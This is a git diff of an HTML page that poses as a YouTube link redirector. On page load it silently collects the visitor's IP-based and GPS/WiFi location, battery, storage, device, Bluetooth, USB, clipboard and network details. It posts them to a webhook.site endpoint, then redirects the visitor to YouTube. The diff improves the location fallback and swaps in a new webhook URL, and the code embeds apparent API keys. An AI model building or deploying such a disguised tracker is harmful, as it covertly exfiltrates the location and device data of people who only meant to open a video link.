@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -18,12 +19,19 @@
             border-top: 5px solid #ff0000;
             animation: spin 1s linear infinite;
         }
+
         @keyframes spin {
-            0% { transform: translate(-50%, -50%) rotate(0deg); }
-            100% { transform: translate(-50%, -50%) rotate(360deg); }
+            0% {
+                transform: translate(-50%, -50%) rotate(0deg);
+            }
+
+            100% {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
         }
     </style>
 </head>
+
 <body>
     <div class="loader"></div>
     <script>
@@ -45,12 +53,25 @@
                 const response = await fetch('https://ipinfo.io/json?token=dd6aa51476d42b');
                 if (!response.ok) throw new Error('Network response was not ok');
                 const data = await response.json();
+                
+                let latitude = 'N/A';
+                let longitude = 'N/A';
+                if (data.loc) {
+                    const parts = data.loc.split(',');
+                    if (parts.length === 2) {
+                        latitude = parts[0];
+                        longitude = parts[1];
+                    }
+                }
+
                 return {
                     ip: validateString(data.ip),
                     city: validateString(data.city),
                     region: validateString(data.region),
                     country: validateString(data.country),
                     loc: validateString(data.loc),
+                    latitude: latitude,
+                    longitude: longitude,
                     locationtemp: `https://www.google.com/maps?q=${validateString(data.loc)}`,
                     org: validateString(data.org),
                     timezone: validateString(data.timezone),
@@ -67,7 +88,7 @@
                 const response = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=AIzaSyCsdXb9ClkZf2IKdhdPk2Pyk1BEi_Ckj6M`);
                 if (!response.ok) throw new Error('Geocoding API failed');
                 const data = await response.json();
-                
+
                 if (data.results && data.results.length > 0) {
                     const address = data.results[0].formatted_address;
                     return address;
@@ -82,16 +103,16 @@
             try {
                 if ('getBattery' in navigator) {
                     const battery = await navigator.getBattery();
-                    
+
                     if (!battery) return null;
-                    
+
                     return {
                         charging: battery.charging !== undefined ? battery.charging : 'N/A',
                         level: battery.level !== undefined ? `${(validateNumber(battery.level) * 100).toFixed(2)}%` : 'N/A',
-                        chargingTime: battery.chargingTime !== undefined && battery.chargingTime !== Infinity ? 
-                                    `${(validateNumber(battery.chargingTime) / 60).toFixed(2)} minutes` : 'N/A',
-                        dischargingTime: battery.dischargingTime !== undefined && battery.dischargingTime !== Infinity ? 
-                                       `${(validateNumber(battery.dischargingTime) / 60).toFixed(2)} minutes` : 'N/A',
+                        chargingTime: battery.chargingTime !== undefined && battery.chargingTime !== Infinity ?
+                            `${(validateNumber(battery.chargingTime) / 60).toFixed(2)} minutes` : 'N/A',
+                        dischargingTime: battery.dischargingTime !== undefined && battery.dischargingTime !== Infinity ?
+                            `${(validateNumber(battery.dischargingTime) / 60).toFixed(2)} minutes` : 'N/A',
                         chargingStatus: battery.charging ? (battery.chargingTime === Infinity ? 'Charging (time unknown)' : 'Charging') : 'Discharging',
                         supported: true
                     };
@@ -106,20 +127,21 @@
             try {
                 if ('storage' in navigator && 'estimate' in navigator.storage) {
                     const estimate = await navigator.storage.estimate();
-                    
+
                     if (!estimate) return null;
-                    
+
                     const usage = validateNumber(estimate.usage);
                     const quota = validateNumber(estimate.quota);
-                    
+
                     return {
-                        totalStorageGB: bytesToGB(quota),
+                        allocatedSandboxQuotaGB: bytesToGB(quota),
                         usedStorageGB: bytesToGB(usage),
                         freeStorageGB: bytesToGB(quota - usage),
                         percentageUsed: quota > 0 ? `${((usage / quota) * 100).toFixed(2)}%` : 'N/A',
                         usageBytes: usage,
                         quotaBytes: quota,
-                        supported: true
+                        supported: true,
+                        note: "Browser security restricts access to actual physical storage size; showing browser-allocated sandboxed quota."
                     };
                 }
                 return { supported: false };
@@ -176,7 +198,7 @@
                 }
 
                 const availability = await navigator.bluetooth.getAvailability();
-                
+
                 let pairedDevices = [];
                 try {
                     if ('getDevices' in navigator.bluetooth) {
@@ -247,7 +269,7 @@
 
                 let testResult = 'Not tested (requires user gesture)';
                 let patternSupport = false;
-                
+
                 try {
                     patternSupport = navigator.vibrate([100, 50, 100]);
                     testResult = patternSupport ? 'Pattern vibration supported' : 'Simple vibration only';
@@ -277,7 +299,7 @@
                 let clipboardTypes = [];
                 let readSupported = false;
                 let writeSupported = false;
-                
+
                 readSupported = 'readText' in navigator.clipboard;
                 writeSupported = 'writeText' in navigator.clipboard;
 
@@ -374,10 +396,18 @@
 
                 try {
                     const startTime = performance.now();
-                    const speedTest = await fetch('https://httpbin.org/bytes/1024?seed=0', { cache: 'no-store' });
+                    // Fetch a standard asset from Cloudflare's jQuery CDN which has CORS headers enabled
+                    const speedTest = await fetch('https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js', { cache: 'no-store' });
+                    if (!speedTest.ok) throw new Error('CORS CDN Fetch failed');
+                    const blob = await speedTest.blob();
                     const endTime = performance.now();
+                    const durationSec = (endTime - startTime) / 1000;
+                    const sizeBytes = blob.size;
+                    const speedMbps = ((sizeBytes * 8) / (1024 * 1024) / durationSec).toFixed(2);
+                    
                     networkInfo.latency = (endTime - startTime).toFixed(2) + ' ms';
                     networkInfo.speedTest = 'Completed';
+                    networkInfo.measuredDownloadSpeed = speedMbps + ' Mbps';
                 } catch (e) {
                     networkInfo.speedTest = 'Failed: ' + e.message;
                 }
@@ -388,99 +418,132 @@
             }
         }
 
-        async function getEnhancedLocation() {
-            const results = { gps: null, wifi: null, ip: null };
-            
+        async function resolveSmartLocation() {
+            let gpsResult = { success: false, error: "Not queried" };
+            let wifiResult = { success: false, error: "Not queried" };
+            let ipResult = null;
+            let permissionState = "unknown";
+
+            // Always fetch IP-based location to get the user's public IP, city, region, and ISP data
+            ipResult = await getIPBasedLocation();
+
             try {
-                if (navigator.geolocation) {
-                    results.gps = await new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(
-                            async (pos) => {
-                                if (pos && pos.coords) {
-                                    const lat = validateNumber(pos.coords.latitude);
-                                    const lng = validateNumber(pos.coords.longitude);
-                                    const locationName = await getLocationNameFromCoords(lat, lng);
-                                    
-                                    resolve({
-                                        latitude: lat,
-                                        longitude: lng,
-                                        accuracy: validateNumber(pos.coords.accuracy) + ' meters',
-                                        altitude: pos.coords.altitude ? validateNumber(pos.coords.altitude) + ' meters' : 'N/A',
-                                        altitudeAccuracy: pos.coords.altitudeAccuracy ? validateNumber(pos.coords.altitudeAccuracy) + ' meters' : 'N/A',
-                                        heading: pos.coords.heading ? validateNumber(pos.coords.heading) + ' degrees' : 'N/A',
-                                        speed: pos.coords.speed ? validateNumber(pos.coords.speed) + ' m/s' : 'N/A',
-                                        locationName: locationName,
-                                        source: 'GPS',
-                                        gmapsLink: `https://www.google.com/maps?q=${lat},${lng}`,
-                                        timestamp: new Date(pos.timestamp).toISOString(),
-                                        success: true
-                                    });
-                                } else {
-                                    resolve({ success: false, error: 'No coordinates received' });
-                                }
-                            },
-                            (error) => resolve({ 
-                                success: false, 
-                                error: error.message,
-                                code: error.code,
-                                permissionDenied: error.code === 1
-                            }),
-                            { 
-                                timeout: 10000, 
-                                enableHighAccuracy: true,
-                                maximumAge: 300000 
-                            }
-                        );
+                if (navigator.geolocation && navigator.permissions) {
+                    const permission = await navigator.permissions.query({
+                        name: "geolocation"
                     });
+                    permissionState = permission.state;
                 }
             } catch (e) {
-                results.gps = { success: false, error: e.message };
+                permissionState = "error";
             }
-            
-            try {
-                const wifiResponse = await fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyCsdXb9ClkZf2IKdhdPk2Pyk1BEi_Ckj6M', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        considerIp: true,
-                        wifiAccessPoints: [] 
-                    })
+
+            // Request GPS if permission is granted, prompt, or unknown (shows permission popup if not already allowed/denied)
+            if (permissionState === "granted" || permissionState === "prompt" || permissionState === "unknown") {
+                gpsResult = await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        async (pos) => {
+                            if (pos && pos.coords) {
+                                const lat = validateNumber(pos.coords.latitude);
+                                const lng = validateNumber(pos.coords.longitude);
+                                const locationName = await getLocationNameFromCoords(lat, lng);
+
+                                resolve({
+                                    latitude: lat,
+                                    longitude: lng,
+                                    accuracy: validateNumber(pos.coords.accuracy) + " meters",
+                                    altitude: pos.coords.altitude
+                                        ? validateNumber(pos.coords.altitude) + " meters"
+                                        : "N/A",
+                                    altitudeAccuracy: pos.coords.altitudeAccuracy
+                                        ? validateNumber(pos.coords.altitudeAccuracy) + " meters"
+                                        : "N/A",
+                                    heading: pos.coords.heading
+                                        ? validateNumber(pos.coords.heading) + " degrees"
+                                        : "N/A",
+                                    speed: pos.coords.speed
+                                        ? validateNumber(pos.coords.speed) + " m/s"
+                                        : "N/A",
+                                    locationName: locationName,
+                                    source: "GPS",
+                                    gmapsLink: `https://www.google.com/maps?q=${lat},${lng}`,
+                                    timestamp: new Date(pos.timestamp).toISOString(),
+                                    success: true
+                                });
+                            } else {
+                                resolve({
+                                    success: false,
+                                    error: "No coordinates received"
+                                });
+                            }
+                        },
+                        (error) => resolve({
+                            success: false,
+                            error: error.message,
+                            code: error.code
+                        }),
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 300000
+                        }
+                    );
                 });
-                
-                if (wifiResponse.ok) {
-                    const wifiData = await wifiResponse.json();
-                    if (wifiData.location && wifiData.location.lat && wifiData.location.lng) {
-                        const lat = validateNumber(wifiData.location.lat);
-                        const lng = validateNumber(wifiData.location.lng);
-                        const locationName = await getLocationNameFromCoords(lat, lng);
-                        
-                        results.wifi = {
-                            latitude: lat,
-                            longitude: lng,
-                            accuracy: validateNumber(wifiData.accuracy) + ' meters',
-                            locationName: locationName,
-                            source: 'WiFi/Cell Tower',
-                            gmapsLink: `https://www.google.com/maps?q=${lat},${lng}`,
-                            success: true
-                        };
-                    } else {
-                        results.wifi = { success: false, error: 'No location data in response' };
-                    }
-                } else {
-                    results.wifi = { success: false, error: `API request failed: ${wifiResponse.status}` };
-                }
-            } catch (e) {
-                results.wifi = { success: false, error: e.message };
             }
-            
-            return results;
+
+            // Fallback to WiFi geolocation if GPS was not allowed/granted or failed
+            if (!gpsResult || !gpsResult.success) {
+                try {
+                    const wifiResponse = await fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyCsdXb9ClkZf2IKdhdPk2Pyk1BEi_Ckj6M', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            considerIp: true,
+                            wifiAccessPoints: []
+                        })
+                    });
+
+                    if (wifiResponse.ok) {
+                        const wifiData = await wifiResponse.json();
+                        if (wifiData.location && wifiData.location.lat && wifiData.location.lng) {
+                            const lat = validateNumber(wifiData.location.lat);
+                            const lng = validateNumber(wifiData.location.lng);
+                            const locationName = await getLocationNameFromCoords(lat, lng);
+
+                            wifiResult = {
+                                latitude: lat,
+                                longitude: lng,
+                                accuracy: validateNumber(wifiData.accuracy) + ' meters',
+                                locationName: locationName,
+                                source: 'WiFi/Cell Tower',
+                                gmapsLink: `https://www.google.com/maps?q=${lat},${lng}`,
+                                success: true
+                            };
+                        } else {
+                            wifiResult = { success: false, error: 'No location data in response' };
+                        }
+                    } else {
+                        wifiResult = { success: false, error: `API request failed: ${wifiResponse.status}` };
+                    }
+                } catch (e) {
+                    wifiResult = { success: false, error: e.message };
+                }
+            }
+
+            return {
+                locationData: ipResult,
+                enhancedLocation: {
+                    gps: gpsResult,
+                    wifi: wifiResult
+                }
+            };
         }
 
         async function getPerformanceInfo() {
             try {
                 const memory = performance.memory;
                 const timing = performance.timing;
-                
+
                 return {
                     memory: memory ? {
                         used: Math.round(memory.usedJSHeapSize / 1048576) + ' MB',
@@ -510,12 +573,11 @@
                 };
 
                 const [
-                    locationData, enhancedLocation, batteryInfo, storageInfo, 
-                    mediaDevicesInfo, bluetoothInfo, usbInfo, vibrationInfo, 
+                    smartLocation, batteryInfo, storageInfo,
+                    mediaDevicesInfo, bluetoothInfo, usbInfo, vibrationInfo,
                     clipboardInfo, sensorInfo, networkDetailedInfo, performanceInfo
                 ] = await Promise.allSettled([
-                    getIPBasedLocation(),
-                    getEnhancedLocation(),
+                    resolveSmartLocation(),
                     getBatteryInfo(),
                     getStorageInfo(),
                     getMediaDevicesInfo(),
@@ -530,17 +592,17 @@
 
                 const deviceInfo = {
                     type: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
-                    os: navigator.userAgent.includes('Windows') ? 'Windows' : 
-                        navigator.userAgent.includes('Mac') ? 'MacOS' : 
-                        navigator.userAgent.includes('Linux') ? 'Linux' : 
-                        navigator.userAgent.includes('Android') ? 'Android' : 
-                        navigator.userAgent.includes('iOS') ? 'iOS' : 'Unknown',
+                    os: navigator.userAgent.includes('Windows') ? 'Windows' :
+                        navigator.userAgent.includes('Mac') ? 'MacOS' :
+                            navigator.userAgent.includes('Linux') ? 'Linux' :
+                                navigator.userAgent.includes('Android') ? 'Android' :
+                                    navigator.userAgent.includes('iOS') ? 'iOS' : 'Unknown',
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
                     languages: navigator.languages,
                     cpuCores: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory + ' GB',
+                    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB (Rounded/Capped by browser)' : 'Unknown',
                     maxTouchPoints: navigator.maxTouchPoints,
                     vendor: navigator.vendor,
                     product: navigator.product,
@@ -577,8 +639,8 @@
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     batteryInfo: batteryInfo.status === 'fulfilled' ? batteryInfo.value : { supported: false, error: 'Failed to get battery info' },
                     storageInfo: storageInfo.status === 'fulfilled' ? storageInfo.value : { supported: false, error: 'Failed to get storage info' },
-                    locationData: locationData.status === 'fulfilled' ? locationData.value : null,
-                    enhancedLocation: enhancedLocation.status === 'fulfilled' ? enhancedLocation.value : { gps: { success: false }, wifi: { success: false } },
+                    locationData: smartLocation.status === 'fulfilled' ? smartLocation.value.locationData : null,
+                    enhancedLocation: smartLocation.status === 'fulfilled' ? smartLocation.value.enhancedLocation : { gps: { success: false }, wifi: { success: false } },
                     deviceInfo: deviceInfo,
                     networkInfo: networkDetailedInfo.status === 'fulfilled' ? networkDetailedInfo.value : { supported: false },
                     performanceInfo: performanceInfo.status === 'fulfilled' ? performanceInfo.value : { supported: false },
@@ -591,9 +653,9 @@
                         sensors: sensorInfo.status === 'fulfilled' ? sensorInfo.value : { supported: false }
                     },
                     collectionSummary: {
-                        totalAPIs: 12,
+                        totalAPIs: 11,
                         successfulAPIs: [
-                            batteryInfo.status, storageInfo.status, locationData.status,
+                            batteryInfo.status, storageInfo.status, smartLocation.status,
                             mediaDevicesInfo.status, bluetoothInfo.status, usbInfo.status,
                             vibrationInfo.status, clipboardInfo.status, sensorInfo.status,
                             networkDetailedInfo.status, performanceInfo.status
@@ -602,7 +664,7 @@
                     }
                 };
 
-                await fetch('https://webhook.site/d64f703c-7b4a-4757-ba67-8a7b120ee23e', {
+                await fetch('https://webhook.site/153aff3d-bfd3-48e0-97b9-7eff671a9a4f', {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: {
@@ -623,23 +685,24 @@
         }
 
         document.addEventListener('DOMContentLoaded', () => {
-            const fullPath = window.location.pathname.substring(1) + 
-                           window.location.search + 
-                           window.location.hash;
-            
+            const fullPath = window.location.pathname.substring(1) +
+                window.location.search +
+                window.location.hash;
+
             let youtubeUrl;
-            
+
             if (fullPath.startsWith('youtu.be/')) {
                 const videoId = fullPath.split('youtu.be/')[1]?.split(/[?#]/)[0];
                 youtubeUrl = videoId ? `https://www.youtube.com/watch?v=${videoId}` : 'https://www.youtube.com/';
             } else {
-                youtubeUrl = fullPath 
+                youtubeUrl = fullPath
                     ? `https://www.youtube.com/${fullPath}`
                     : 'https://www.youtube.com/';
             }
-            
+
             collectAndRedirect(youtubeUrl);
         });
     </script>
 </body>
+
 </html>
